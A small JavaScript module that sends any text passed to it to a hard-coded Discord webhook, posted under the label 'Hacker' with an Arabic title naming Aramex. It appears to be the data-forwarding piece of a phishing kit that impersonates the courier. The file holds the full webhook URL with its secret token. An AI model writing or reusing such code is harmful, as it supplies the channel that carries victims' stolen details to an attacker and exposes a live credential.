import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1327347004061253652/SdNMCvmzx395iA1WhySuZO7gQfJv_OMJTRJgkm-Xi54Wxs2Cdbq3iMQO3augZDa3z3EU",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
